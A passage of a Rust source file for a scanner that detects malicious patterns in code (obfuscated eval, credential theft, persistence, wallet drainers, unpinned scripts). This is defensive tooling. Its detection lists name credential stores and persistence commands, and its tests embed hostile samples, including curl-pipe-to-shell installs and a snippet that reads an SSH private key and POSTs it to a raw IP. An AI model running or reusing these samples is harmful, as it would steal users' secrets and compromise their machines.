//! Code that behaves like an attack: strings decoded at run time and fed
//! to `eval`, payloads kept as arrays of numbers, hand-rolled decoders,
//! privilege escalation and persistence in scripts, reads of credential
//! stores sent over the network, code that asks a crypto wallet to sign or
//! approve, pages that load third-party scripts without a pinned hash
//! (the supply-chain drainer pattern), and traffic to raw IP addresses.
//!
//! None of these is wrong on its own, so the verdict depends on where it
//! sits: hex tables are normal in a shader or a kernel and a colour in CSS,
//! out of place in a web page's script; `sudo` is normal in an installer
//! and alarming in an npm install script; asking a wallet to sign is what
//! a dapp does, and what a drainer hidden in a dependency does. A finding
//! fails where the pattern is out of place for its language and context,
//! warns elsewhere, and a policy file (`--suspect-policy`) turns any id or
//! path into a warning for good. It always warns: an override never
//! silences.

use crate::repos;
use std::path::Path;

/// One suspicious thing in one file.
#[derive(Clone, Debug, PartialEq)]
pub struct Suspect {
    /// Relative to the target.
    pub file: String,
    pub id: &'static str,
    pub line: usize,
    pub note: String,
    /// Fails the scan (before the policy is applied).
    pub hard: bool,
}

/// Where a file sits, which decides what is out of place in it.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Context {
    /// JavaScript, TypeScript and the templates that embed them.
    Web,
    /// Pages: HTML and the component formats that carry `<script>` tags.
    Markup,
    Shell,
    Python,
    /// C-family, Rust, Swift, assembly, GPU shaders: numeric tables live here.
    Native,
    Style,
    /// package.json, binding.gyp, Makefiles: install-time commands.
    Manifest,
    Other,
}

pub fn context(file: &str) -> Context {
    let lower = file.to_ascii_lowercase();
    let name = lower.rsplit('/').next().unwrap_or(&lower);
    if ["package.json", "binding.gyp", "makefile", "justfile", "composer.json", "setup.py", "pyproject.toml"]
        .contains(&name)
    {
        return Context::Manifest;
    }
    let ext = name.rsplit_once('.').map(|(_, e)| e).unwrap_or("");
    match ext {
        "js" | "mjs" | "cjs" | "ts" | "tsx" | "jsx" | "vue" | "svelte" | "astro" => Context::Web,
        "html" | "htm" | "xhtml" | "mdx" => Context::Markup,
        "sh" | "bash" | "zsh" | "fish" | "ps1" | "bat" | "cmd" | "command" => Context::Shell,
        "py" | "pyw" | "rb" | "pl" | "php" | "lua" => Context::Python,
        "c" | "h" | "cc" | "cpp" | "hpp" | "m" | "mm" | "rs" | "swift" | "go" | "java" | "kt" | "cs" | "zig" | "s"
        | "asm" | "cu" | "cuh" | "cl" | "metal" | "glsl" | "wgsl" | "hlsl" | "frag" | "vert" => Context::Native,
        "css" | "scss" | "sass" | "less" => Context::Style,
        _ => Context::Other,
    }
}

/// Built output: not a person's source, and read elsewhere (the bundle a
/// page serves is what the page's own source becomes).
fn generated_path(file: &str) -> bool {
    let l = format!("/{}", file.to_ascii_lowercase());
    ["/_site/", "/out/", "/.next/", "/dist/", "/build/", "/coverage/", "/target/", "/.cache/"]
        .iter()
        .any(|p| l.contains(p))
}

/// Tests and fixtures: what they contain is the thing under test.
fn test_path(file: &str) -> bool {
    let l = format!("/{}", file.to_ascii_lowercase());
    [".test.", ".spec.", "_test.", "/tests/", "/test/", "/__tests__/", "/spec/", "/fixtures/", "/testdata/"]
        .iter()
        .any(|p| l.contains(p))
}

/// Whether the file runs commands at all (a script, not prose in a string).
fn runs_commands(text: &str, ctx: Context) -> bool {
    match ctx {
        Context::Shell | Context::Manifest => true,
        Context::Web => [
            "child_process",
            "execSync(",
            "spawnSync(",
            "spawn(",
            "execFile(",
            "exec(",
            "Deno.run(",
            "Deno.Command(",
            "Bun.spawn(",
            "Bun.$",
        ]
        .iter()
        .any(|s| text.contains(s)),
        Context::Python => {
            ["subprocess", "os.system(", "os.popen(", "commands.getoutput(", "pty.spawn(", "system(", "backtick", "`"]
                .iter()
                .any(|s| text.contains(s))
        }
        _ => false,
    }
}

/// Paths where numeric tables and escapes are the point.
fn table_path(file: &str) -> bool {
    let l = file.to_ascii_lowercase();
    [
        "vector", "fixture", "testdata", "golden", "wasm", "shader", "kernel", "gpu", "font", "codec", "table", "lut",
        "icon", "sprite", "emoji", "unicode", "crc", "sha", "md5", "aes", "/dist/", "/build/", ".min.",
    ]
    .iter()
    .any(|p| l.contains(p))
}

/// Exemptions: an id, or `path:<substring>`; a finding matching one is
/// never a failure, only a warning.
#[derive(Clone, Debug, Default)]
pub struct Policy {
    pub ids: Vec<String>,
    pub paths: Vec<String>,
}

impl Policy {
    pub fn parse(text: &str) -> Policy {
        let mut p = Policy::default();
        for l in text.lines().map(str::trim).filter(|l| !l.is_empty() && !l.starts_with('#')) {
            match l.strip_prefix("path:") {
                Some(path) => p.paths.push(path.trim().to_string()),
                None => p.ids.push(l.trim_start_matches("SUSPECT-").to_ascii_uppercase()),
            }
        }
        p
    }

    pub fn exempt(&self, s: &Suspect) -> bool {
        self.ids.iter().any(|i| i == s.id.trim_start_matches("SUSPECT-"))
            || self.paths.iter().any(|p| s.file.contains(p.as_str()))
    }
}

const MAX_FILE: u64 = 1 << 20;
const MAX_TARGET: u64 = 64 << 20;

/// What was scanned: a repo (its own source, every rule) or code installed
/// from elsewhere (an extension or plugin: the rules about behaviour, not
/// about style).
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Kind {
    Repo,
    Installed,
}

/// Every suspicious thing under `root`, one per (file, id), after the policy.
pub fn scan_dir(root: &Path, kind: Kind, policy: &Policy) -> Vec<Suspect> {
    let mut out = Vec::new();
    let mut budget = MAX_TARGET;
    let mut wallet_anywhere = false;
    let mut pages: Vec<(String, String)> = Vec::new();
    for (dir, files) in repos::walk(root, 6) {
        for name in files {
            let rel_path = dir.join(&name);
            let rel = rel_path.strip_prefix(root).unwrap_or(&rel_path).to_string_lossy().into_owned();
            let ctx = context(&rel);
            if ctx == Context::Other || (kind == Kind::Repo && generated_path(&rel)) {
                continue;
            }
            let Ok(meta) = std::fs::metadata(&rel_path) else { continue };
            if !meta.is_file() || meta.len() > MAX_FILE || meta.len() > budget {
                continue;
            }
            budget -= meta.len();
            let Ok(text) = crate::system::read_capped(&rel_path, MAX_FILE) else { continue };
            let found = scan_text(&rel, &text, kind);
            if found.iter().any(|s| s.id == "SUSPECT-WALLET-SIGNING") {
                wallet_anywhere = true;
            }
            if ctx == Context::Markup || ctx == Context::Web {
                pages.push((rel.clone(), text));
            }
            out.extend(found);
        }
    }
    // A page that signs transactions and loads an unpinned third-party
    // script is the drainer pattern: the script decides what gets signed.
    for (rel, text) in &pages {
        out.extend(third_party_scripts(rel, text, wallet_anywhere));
    }
    for s in &mut out {
        if s.hard && policy.exempt(s) {
            s.hard = false;
            s.note.push_str(" (exempted by the suspect policy: still a warning)");
        }
    }
    out.sort_by(|a, b| (a.file.as_str(), a.id).cmp(&(b.file.as_str(), b.id)));
    out
}

fn line_of(text: &str, needle: &str) -> usize {
    text.find(needle).map(|i| text[..i].matches('\n').count() + 1).unwrap_or(0)
}

fn has_any(text: &str, needles: &[&'static str]) -> Option<&'static str> {
    needles.iter().copied().find(|n| text.contains(n))
}

const EXEC: &[&str] = &[
    "eval(",
    "new Function(",
    "Function(\"",
    "Function('",
    "setTimeout(\"",
    "setTimeout('",
    "setInterval(\"",
    "execScript(",
    "vm.runInThisContext(",
    "vm.runInNewContext(",
];
const DECODE: &[&str] = &[
    "atob(",
    "String.fromCharCode(",
    "fromCharCode.apply(",
    "unescape(",
    "decodeURIComponent(escape(",
    ".reverse().join(",
    "Buffer.from(",
    "TextDecoder(",
    "\\x",
    "\\u00",
];
const PY_EXEC: &[&str] = &["exec(", "eval(", "compile("];
const PY_DECODE: &[&str] = &[
    "b64decode(",
    "base64.",
    "marshal.loads(",
    "zlib.decompress(",
    "codecs.decode(",
    "bytes.fromhex(",
    "rot13",
    "lzma.decompress(",
];

/// Rules over one file.
pub fn scan_text(file: &str, text: &str, kind: Kind) -> Vec<Suspect> {
    let ctx = context(file);
    let mut out = Vec::new();
    let push = |out: &mut Vec<Suspect>, id: &'static str, line: usize, note: String, hard: bool| {
        out.push(Suspect { file: file.into(), id, line, note, hard });
    };
    let table = table_path(file);

    // 1. Decoded then executed.
    let (execs, decodes): (&[&'static str], &[&'static str]) = match ctx {
        Context::Web | Context::Markup => (EXEC, DECODE),
        Context::Python => (PY_EXEC, PY_DECODE),
        _ => (&[], &[]),
    };
    let exec = has_any(text, execs);
    // Decoding somewhere and evaluating somewhere else is every big bundle;
    // the two within a few lines of each other is a loader.
    let near = near_pair(text, execs, decodes);
    let decoded_exec = near.is_some();
    if let Some((e, d)) = near {
        push(
            &mut out,
            "SUSPECT-EXEC-DECODED",
            line_of(text, e),
            format!(
                "`{}` runs code built at run time with `{}`: what executes isn't what you can read",
                e.trim_end_matches(['(', '"', '\'']),
                d.trim_end_matches('(')
            ),
            true,
        );
    }

    // 2. A payload kept as numbers.
    if matches!(ctx, Context::Web | Context::Markup | Context::Python | Context::Shell)
        && !table
        && let Some((n, line, what)) = numeric_array(text)
    {
        {
            let decoder = array_decoded(text, line);
            let hard = decoded_exec && !test_path(file);
            push(
                &mut out,
                "SUSPECT-ENCODED-PAYLOAD",
                line,
                format!(
                    "an array of {n} {what} literals{}",
                    if decoder {
                        ", and code that turns numbers into text: a payload in disguise"
                    } else {
                        " in a script, where a string would do"
                    }
                ),
                hard,
            );
        }
    }

    // 3. A hand-rolled string decoder.
    if matches!(ctx, Context::Web | Context::Markup)
        && text.contains("charCodeAt(")
        && text.contains("fromCharCode")
        && (text.contains(" ^ ")
            || text.contains("^=")
            || text.contains("<<")
            || text.contains(">>")
            || text.contains("% 256")
            || text.contains("& 255"))
    {
        push(
            &mut out,
            "SUSPECT-STRING-DECODER",
            line_of(text, "charCodeAt("),
            "builds strings from character codes with arithmetic: a decoder for text it doesn't want read".into(),
            decoded_exec,
        );
    }

    // 4. Source written as escapes.
    if matches!(ctx, Context::Web | Context::Markup | Context::Python) && !table {
        let (run, line) = longest_escape_run(text);
        if run >= 30 {
            push(
                &mut out,
                "SUSPECT-ESCAPED-SOURCE",
                line,
                format!("a run of {run} `\\x`/`\\u` escapes: text written so it can't be read"),
                exec.is_some(),
            );
        }
    }

    // 5. Privilege escalation and persistence. A shell script that uses
    // sudo is an installer; an npm script, a node or Python file that runs
    // commands, or installed code doing the same is not.
    if matches!(ctx, Context::Shell | Context::Python | Context::Web | Context::Manifest) {
        let scripted = runs_commands(text, ctx);
        let strong_ctx = ctx == Context::Manifest || (scripted && ctx != Context::Shell) || kind == Kind::Installed;
        let soft = test_path(file) || ctx == Context::Shell;
        let mut found: Option<(usize, String, bool)> = None;
        for needle in ["curl ", "wget "] {
            if let Some(l) = pipe_to_shell(text, needle) {
                found = Some((l, format!("pipes a download into a shell (`{}… | sh`)", needle.trim()), strong_ctx));
                break;
            }
        }
        if found.is_none() {
            let esc: &[(&str, &str, bool)] = &[
                ("with administrator privileges", "asks for an admin password through AppleScript", true),
                ("chmod u+s", "sets the setuid bit", true),
                ("chmod +s", "sets the setuid bit", true),
                ("chmod 4755", "sets the setuid bit", true),
                ("/etc/sudoers", "edits sudoers", true),
                ("authorized_keys", "adds an ssh key", true),
                ("/Library/LaunchDaemons", "installs a launch daemon", true),
                ("csrutil disable", "turns off System Integrity Protection", true),
                ("spctl --master-disable", "turns off Gatekeeper", true),
                ("xattr -d com.apple.quarantine", "strips the quarantine flag from a download", true),
                ("Library/LaunchAgents", "installs a launch agent", false),
                ("crontab -", "installs a cron job", false),
                ("systemctl enable", "installs a service", false),
                ("/etc/systemd/system", "installs a service", false),
                ("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "installs a Windows run key", true),
                ("schtasks /create", "installs a scheduled task", true),
                ("sudo ", "uses sudo", false),
            ];
            for (needle, what, strong) in esc {
                if text.contains(needle) {
                    found = Some((
                        line_of(text, needle),
                        format!("{what} (`{}`)", needle.trim()),
                        strong_ctx && (*strong || ctx == Context::Manifest),
                    ));
                    break;
                }
            }
        }
        if let Some((line, note, hard)) = found {
            push(&mut out, "SUSPECT-PRIV-ESCALATION", line, note, hard && !soft);
        }
    }

    // 6. Credential stores, and whether anything is sent anywhere.
    let stores: &[(&str, &str)] = &[
        (".ssh/id_", "ssh private keys"),
        (".aws/credentials", "AWS credentials"),
        (".npmrc", "npm tokens"),
        (".git-credentials", "git credentials"),
        (".config/gcloud", "Google Cloud credentials"),
        (".kube/config", "Kubernetes credentials"),
        (".docker/config.json", "registry logins"),
        ("Login Data", "browser saved passwords"),
        ("/Cookies", "browser cookies"),
        ("Local Storage/leveldb", "browser extension storage (wallets keep keys there)"),
        ("find-generic-password", "the macOS keychain"),
        ("find-internet-password", "the macOS keychain"),
        ("wallet.dat", "a wallet file"),
        ("keystore", "a key store"),
        (".config/solana/id.json", "a Solana key"),
        ("Keychains/login.keychain", "the login keychain"),
    ];
    let code_ctx = matches!(ctx, Context::Web | Context::Python | Context::Shell);
    if let Some((needle, what)) = if code_ctx { stores.iter().find(|(n, _)| text.contains(n)) } else { None } {
        let sends = [
            "fetch(",
            "XMLHttpRequest",
            "sendBeacon(",
            "http.request(",
            "https.request(",
            "axios.",
            "WebSocket(",
            "curl ",
            "wget ",
            "requests.post(",
            "urllib.request",
            "socket.connect(",
            "nc ",
            "ncat ",
        ]
        .iter()
        .any(|s| text.contains(s));
        push(
            &mut out,
            "SUSPECT-CREDENTIAL-ACCESS",
            line_of(text, needle),
            format!("reads {what} (`{needle}`){}", if sends { " and talks to the network" } else { "" }),
            (sends || kind == Kind::Installed) && ctx != Context::Shell && !test_path(file),
        );
    }

    // 7. Asking a wallet to sign or approve.
    if matches!(ctx, Context::Web | Context::Markup) {
        let signs: &[&str] = &[
            "approve(",
            "eth_signTypedData",
            "signTypedData",
            "personal_sign",
            "eth_sendTransaction",
            "setApprovalForAll",
            "increaseAllowance",
            "signAllTransactions",
            "signAndSendTransaction",
            "signTransaction(",
            "permit(",
            "Permit2",
            "eth_requestAccounts",
        ];
        let unlimited = text.contains("MaxUint256")
            || text.contains("ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
            || text.contains("2 ** 256")
            || text.contains("2n ** 256n");
        if let Some(s) = has_any(text, signs) {
            let wallet = [
                "window.ethereum",
                "window.solana",
                "window.phantom",
                "ethereum.request",
                "solana.connect",
                "WalletConnect",
                "wagmi",
                "ethers",
                "viem",
                "@solana/web3",
                "web3",
            ]
            .iter()
            .any(|w| text.contains(w));
            if wallet || (s == "approve(" && unlimited) {
                let obfuscated = out.iter().any(|o| {
                    matches!(
                        o.id,
                        "SUSPECT-EXEC-DECODED"
                            | "SUSPECT-ENCODED-PAYLOAD"
                            | "SUSPECT-STRING-DECODER"
                            | "SUSPECT-ESCAPED-SOURCE"
                    )
                });
                let hard = obfuscated || kind == Kind::Installed || unlimited;
                push(
                    &mut out,
                    "SUSPECT-WALLET-SIGNING",
                    line_of(text, s),
                    format!(
                        "asks a crypto wallet to sign or approve (`{}`){}{}{}",
                        s.trim_end_matches('('),
                        if unlimited { ", with an unlimited allowance" } else { "" },
                        if obfuscated { ", in obfuscated code" } else { "" },
                        if kind == Kind::Installed {
                            ", from installed code rather than the project's own"
                        } else {
                            ""
                        }
                    ),
                    hard,
                );
            }
        }
    }

    // 8. Traffic to a bare address.
    if matches!(ctx, Context::Web | Context::Markup | Context::Python | Context::Shell)
        && let Some((ip, line)) = raw_ip_url(text)
    {
        {
            let obfuscated = out.iter().any(|o| o.hard);
            push(
                &mut out,
                "SUSPECT-RAW-IP",
                line,
                format!("talks to a bare IP address ({ip}) instead of a name"),
                obfuscated,
            );
        }
    }
    out
}

/// An exec token with a decode token within 200 characters either side.
fn near_pair(text: &str, execs: &[&'static str], decodes: &[&'static str]) -> Option<(&'static str, &'static str)> {
    for e in execs {
        let mut rest = text;
        let mut offset = 0;
        while let Some(i) = rest.find(e) {
            let at = offset + i;
            let lo = at.saturating_sub(200);
            let hi = (at + e.len() + 200).min(text.len());
            let lo = (lo..=at).find(|&b| text.is_char_boundary(b)).unwrap_or(at);
            let hi = (hi..=text.len()).find(|&b| text.is_char_boundary(b)).unwrap_or(text.len());
            let window = &text[lo..hi];
            if let Some(d) = decodes.iter().copied().find(|d| window.contains(d)) {
                return Some((e, d));
            }
            offset = at + e.len();
            rest = &text[offset..];
        }
    }
    None
}

/// `<script src="https://…">` without `integrity=` on a page; plain http
/// always fails; without SRI it fails when the project signs transactions.
pub fn third_party_scripts(file: &str, text: &str, wallet_anywhere: bool) -> Vec<Suspect> {
    let mut out = Vec::new();
    let mut rest = text;
    let mut offset = 0;
    while let Some(i) = rest.find("<script") {
        let start = offset + i;
        let tag_end = rest[i..].find('>').map(|e| i + e).unwrap_or(rest.len());
        let tag = &rest[i..tag_end];
        if let Some(src) = attr(tag, "src") {
            let external = src.starts_with("http://") || src.starts_with("https://") || src.starts_with("//");
            if external && !tag.contains("integrity=") {
                let host = src
                    .trim_start_matches("https://")
                    .trim_start_matches("http://")
                    .trim_start_matches("//")
                    .split('/')
                    .next()
                    .unwrap_or("")
                    .to_string();
                let plain = src.starts_with("http://");
                let line = text[..start].matches('\n').count() + 1;
                out.push(Suspect {
                    file: file.into(),
                    id: "SUSPECT-THIRD-PARTY-SCRIPT",
                    line,
                    note: format!("loads {host}'s script with no integrity hash{}{}: whoever controls that host controls this page", if plain { ", over plain http" } else { "" }, if wallet_anywhere { ", on a project that asks wallets to sign" } else { "" }),
                    hard: plain || wallet_anywhere,
                });
                break;
            }
        }
        offset += tag_end;
        rest = &rest[tag_end..];
    }
    out
}

fn attr<'a>(tag: &'a str, name: &str) -> Option<&'a str> {
    let i = tag.find(&format!("{name}="))?;
    let v = &tag[i + name.len() + 1..];
    let q = v.chars().next()?;
    if q == '"' || q == '\'' { v[1..].split(q).next() } else { v.split([' ', '>', '/']).next() }
}

/// `curl …| sh` and friends: the needle, then a pipe into a shell on the same line.
fn pipe_to_shell(text: &str, needle: &str) -> Option<usize> {
    for (n, line) in text.lines().enumerate() {
        if let Some(i) = line.find(needle) {
            let rest = &line[i..];
            if let Some(p) = rest.find('|') {
                let after = rest[p + 1..].trim_start();
                if ["sh", "bash", "zsh", "sudo sh", "sudo bash", "python", "python3", "node", "perl"].iter().any(|s| {
                    after.starts_with(s)
                        && after[s.len()..].chars().next().is_none_or(|c| !c.is_ascii_alphanumeric() && c != '_')
                }) {
                    return Some(n + 1);
                }
            }
        }
    }
    None
}

/// Whether code that turns numbers into text sits within 20 lines after
/// the array that starts on `line`.
fn array_decoded(text: &str, line: usize) -> bool {
    let after: String = text.lines().skip(line.saturating_sub(1)).take(20).collect::<Vec<_>>().join("\n");
    [
        "fromCharCode",
        "charCodeAt(",
        "TextDecoder",
        "atob(",
        "Buffer.from(",
        "chr(",
        "bytes(",
        "bytearray(",
        ".decode(",
        "unescape(",
    ]
    .iter()
    .any(|s| after.contains(s))
}

/// The longest array of plain numeric literals (hex, binary or small
/// decimals): (count, line, what), when it is 32 or more.
fn numeric_array(text: &str) -> Option<(usize, usize, &'static str)> {
    let mut best: Option<(usize, usize, &'static str)> = None;
    let mut rest = text;
    let mut offset = 0;
    while let Some(i) = rest.find('[') {
        let start = offset + i;
        let body_end = rest[i..].find(']').map(|e| i + e).unwrap_or(rest.len());
        let body = &rest[i + 1..body_end];
        if body.len() > 200_000 {
            break;
        }
        let items: Vec<&str> = body.split(',').map(str::trim).filter(|s| !s.is_empty()).collect();
        let hex = items
            .iter()
            .filter(|s| s.starts_with("0x") && s[2..].chars().all(|c| c.is_ascii_hexdigit()) && s.len() <= 6)
            .count();
        let bin = items.iter().filter(|s| s.starts_with("0b") && s[2..].chars().all(|c| c == '0' || c == '1')).count();
        let dec = items.iter().filter(|s| s.chars().all(|c| c.is_ascii_digit()) && s.len() <= 3).count();
        let n = items.len();
        if n >= 32 {
            let what = if hex == n {
                Some("hex")
            } else if bin == n {
                Some("binary")
            } else if dec == n {
                Some("byte")
            } else {
                None
            };
            if let Some(what) = what
                && best.is_none_or(|(b, _, _)| n > b)
            {
                best = Some((n, text[..start].matches('\n').count() + 1, what));
            }
        }
        offset += body_end;
        rest = &rest[body_end..];
        if rest.is_empty() {
            break;
        }
    }
    best
}

/// The longest run of consecutive `\xHH` or `\uHHHH` escapes and its line.
fn longest_escape_run(text: &str) -> (usize, usize) {
    let (mut best, mut best_line) = (0, 0);
    for (n, line) in text.lines().enumerate() {
        let mut run = 0;
        let mut rest = line;
        while let Some(i) = rest.find('\\') {
            let after = &rest[i + 1..];
            let len = if after.starts_with('x')
                && after.len() >= 3
                && after[1..3].chars().all(|c| c.is_ascii_hexdigit())
            {
                3
            } else if after.starts_with('u') && after.len() >= 5 && after[1..5].chars().all(|c| c.is_ascii_hexdigit()) {
                5
            } else {
                run = 0;
                rest = &rest[i + 1..];
                continue;
            };
            run += 1;
            if run > best {
                best = run;
                best_line = n + 1;
            }
            rest = &after[len..];
        }
    }
    (best, best_line)
}

/// `http://1.2.3.4` or `ws://1.2.3.4` in the text.
fn raw_ip_url(text: &str) -> Option<(String, usize)> {
    for scheme in ["http://", "https://", "ws://", "wss://"] {
        let mut rest = text;
        while let Some(i) = rest.find(scheme) {
            let host: String =
                rest[i + scheme.len()..].chars().take_while(|c| c.is_ascii_digit() || *c == '.').collect();
            let parts: Vec<&str> = host.split('.').collect();
            if parts.len() == 4
                && parts.iter().all(|p| !p.is_empty() && p.parse::<u16>().is_ok_and(|n| n <= 255))
                && !host.starts_with("127.")
                && host != "0.0.0.0"
            {
                let at = text.len() - rest.len() + i;
                return Some((host, text[..at].matches('\n').count() + 1));
            }
            rest = &rest[i + scheme.len()..];
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ids(v: &[Suspect]) -> Vec<(&str, bool)> {
        v.iter().map(|s| (s.id, s.hard)).collect()
    }

    #[test]
    fn decoded_exec_and_payloads() {
        let js = "const p = [0x68,0x65,0x6c,0x6c,0x6f,0x20,0x77,0x6f,0x72,0x6c,0x64,0x21,0x68,0x65,0x6c,0x6c,0x6f,0x20,0x77,0x6f,0x72,0x6c,0x64,0x21,0x68,0x65,0x6c,0x6c,0x6f,0x20,0x77,0x6f,0x72,0x6c];\neval(String.fromCharCode.apply(null, p));\n";
        let got = scan_text("app.js", js, Kind::Repo);
        assert!(
            got.contains(&Suspect {
                file: "app.js".into(),
                id: "SUSPECT-EXEC-DECODED",
                line: 2,
                note: got[0].note.clone(),
                hard: true
            }) || ids(&got).contains(&("SUSPECT-EXEC-DECODED", true)),
            "{got:?}"
        );
        assert!(ids(&got).contains(&("SUSPECT-ENCODED-PAYLOAD", true)), "{got:?}");
        let decoded_only = "const p = [0x68,0x65,0x6c,0x6c,0x6f,0x20,0x77,0x6f,0x72,0x6c,0x64,0x21,0x68,0x65,0x6c,0x6c,0x6f,0x20,0x77,0x6f,0x72,0x6c,0x64,0x21,0x68,0x65,0x6c,0x6c,0x6f,0x20,0x77,0x6f,0x72,0x6c];\nconst s = String.fromCharCode(...p);\n";
        assert_eq!(
            ids(&scan_text("app.js", decoded_only, Kind::Repo)),
            [("SUSPECT-ENCODED-PAYLOAD", false)],
            "decoded but never run: a warning"
        );
        // The same table in a shader or a CRC file is nothing.
        assert!(scan_text("kernels/crc.metal", js, Kind::Repo).is_empty());
        assert!(scan_text("src/tables/crc32.js", "const T = [0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f,0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x1a,0x1b,0x1c,0x1d,0x1e,0x1f,0x20];", Kind::Repo).is_empty());
        // A table alone in ordinary web code only warns.
        let warn = scan_text(
            "src/app.js",
            "const T = [0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,0x0c,0x0d,0x0e,0x0f,0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,0x18,0x19,0x1a,0x1b,0x1c,0x1d,0x1e,0x1f,0x20];",
            Kind::Repo,
        );
        assert_eq!(ids(&warn), [("SUSPECT-ENCODED-PAYLOAD", false)]);
        assert!(scan_text("style.css", "a { color: #ff00aa; } b { color: #00ff00 }", Kind::Repo).is_empty());
        let py = "import base64\nexec(base64.b64decode('aGk='))\n";
        assert_eq!(ids(&scan_text("setup_helper.py", py, Kind::Repo)), [("SUSPECT-EXEC-DECODED", true)]);
    }

    #[test]
    fn decoders_and_escapes() {
        let dec = "function d(s){let o='';for(let i=0;i<s.length;i++){o+=String.fromCharCode(s.charCodeAt(i) ^ 42)}return o}\n";
        assert_eq!(ids(&scan_text("x.js", dec, Kind::Repo)), [("SUSPECT-STRING-DECODER", false)]);
        let dec_eval = format!("{dec}eval(d(\"zz\"))\n");
        let got = scan_text("x.js", &dec_eval, Kind::Repo);
        assert!(ids(&got).contains(&("SUSPECT-STRING-DECODER", true)), "{got:?}");
        let esc = format!("var s = \"{}\";\n", "\\x41".repeat(40));
        assert_eq!(ids(&scan_text("x.js", &esc, Kind::Repo)), [("SUSPECT-ESCAPED-SOURCE", false)]);
        assert!(scan_text("fixtures/x.js", &esc, Kind::Repo).is_empty());
        let (run, line) = longest_escape_run("a\n\\x41\\x42 \\u0041\\u0042\\u0043\n");
        assert_eq!((run, line), (5, 2), "a space between escapes doesn't break the run");
    }

    #[test]
    fn privilege_and_credentials() {
        let sh = "#!/bin/sh\nsudo apt-get install -y foo\n";
        assert_eq!(
            ids(&scan_text("install.sh", sh, Kind::Repo)),
            [("SUSPECT-PRIV-ESCALATION", false)],
            "an installer may sudo"
        );
        let pkg = "{\"scripts\": {\"postinstall\": \"curl -fsSL https://x.y/i.sh | sh\"}}";
        assert_eq!(ids(&scan_text("package.json", pkg, Kind::Repo)), [("SUSPECT-PRIV-ESCALATION", true)]);
        assert_eq!(
            ids(&scan_text("install.sh", "chmod u+s /usr/bin/x\n", Kind::Repo)),
            [("SUSPECT-PRIV-ESCALATION", false)],
            "a shell script always warns"
        );
        let node = "const { execSync } = require('child_process');\nexecSync('curl -fsSL https://x.y/i.sh | sh');\n";
        assert_eq!(
            ids(&scan_text("setup.js", node, Kind::Repo)),
            [("SUSPECT-PRIV-ESCALATION", true)],
            "a node script that runs it fails"
        );
        let prose = "export const copy = 'Run: sudo softwareupdate -i -a';\n";
        assert_eq!(
            ids(&scan_text("src/content/home.ts", prose, Kind::Repo)),
            [("SUSPECT-PRIV-ESCALATION", false)],
            "prose in a string warns"
        );
        assert_eq!(
            ids(&scan_text("src/x.test.ts", node, Kind::Repo)),
            [("SUSPECT-PRIV-ESCALATION", false)],
            "tests warn"
        );
        assert!(
            scan_text("package.nls.json", "{\"d\": \"reads ~/.docker/config.json\"}", Kind::Installed).is_empty(),
            "a string table is not code"
        );
        assert_eq!(pipe_to_shell("curl https://a/b.sh | shuf", "curl "), None);
        assert_eq!(pipe_to_shell("wget -qO- https://a | sudo bash -s", "wget "), Some(1));
        let steal = "const fs=require('fs');const k=fs.readFileSync(process.env.HOME+'/.ssh/id_ed25519');fetch('https://1.2.3.4/x',{method:'POST',body:k});\n";
        let got = scan_text("postinstall.js", steal, Kind::Repo);
        assert!(ids(&got).contains(&("SUSPECT-CREDENTIAL-ACCESS", true)), "{got:?}");
        assert!(ids(&got).contains(&("SUSPECT-RAW-IP", true)), "{got:?}");
        let read_only = "cat ~/.aws/credentials\n";
        assert_eq!(ids(&scan_text("show.sh", read_only, Kind::Repo)), [("SUSPECT-CREDENTIAL-ACCESS", false)]);
    }

    #[test]
    fn wallets_and_third_party_scripts() {
        let dapp = "import { ethers } from 'ethers';\nconst sig = await signer.signTypedData(domain, types, value);\n";
        assert_eq!(
            ids(&scan_text("src/swap.ts", dapp, Kind::Repo)),
            [("SUSPECT-WALLET-SIGNING", false)],
            "a dapp's own code warns"
        );
        let drainer = "import { ethers } from 'ethers';\nawait token.approve(spender, ethers.MaxUint256);\n";
        assert_eq!(
            ids(&scan_text("src/swap.ts", drainer, Kind::Repo)),
            [("SUSPECT-WALLET-SIGNING", true)],
            "unlimited allowance fails"
        );
        assert_eq!(
            ids(&scan_text("ext/content.js", dapp, Kind::Installed)),
            [("SUSPECT-WALLET-SIGNING", true)],
            "installed code fails"
        );
        let obf = format!("{dapp}eval(atob('eA=='));\n");
        let got = scan_text("src/swap.ts", &obf, Kind::Repo);
        assert!(ids(&got).contains(&("SUSPECT-WALLET-SIGNING", true)), "{got:?}");
        let page = "<html><script src=\"https://cdn.perf.example/tag.js\"></script><script src=\"/app.js\"></script><script src=\"https://cdn.jsdelivr.net/x.js\" integrity=\"sha384-abc\" crossorigin=\"anonymous\"></script></html>";
        let t = third_party_scripts("index.html", page, false);
        assert_eq!(ids(&t), [("SUSPECT-THIRD-PARTY-SCRIPT", false)]);
        assert!(t[0].note.contains("cdn.perf.example"));
        assert_eq!(ids(&third_party_scripts("index.html", page, true)), [("SUSPECT-THIRD-PARTY-SCRIPT", true)]);
        assert_eq!(
            ids(&third_party_scripts("index.html", "<script src='http://x.y/a.js'></script>", false)),
            [("SUSPECT-THIRD-PARTY-SCRIPT", true)]
        );
        assert!(third_party_scripts("index.html", "<script src=\"/local.js\"></script>", true).is_empty());
    }

    #[test]
    fn policy_downgrades_but_never_silences() {
        let p = Policy::parse("# mine\nSUSPECT-PRIV-ESCALATION\npath:scripts/legacy/\n");
        assert_eq!(p.ids, ["PRIV-ESCALATION"]);
        let d = crate::system::TempDir::new("suspect").unwrap();
        std::fs::create_dir_all(d.path().join("scripts/legacy")).unwrap();
        std::fs::write(d.path().join("scripts/legacy/old.js"), "eval(atob('x'))").unwrap();
        std::fs::write(d.path().join("package.json"), "{\"scripts\": {\"postinstall\": \"chmod u+s x\"}}").unwrap();
        let got = scan_dir(d.path(), Kind::Repo, &p);
        assert_eq!(got.len(), 2, "{got:?}");
        assert!(got.iter().all(|s| !s.hard), "{got:?}");
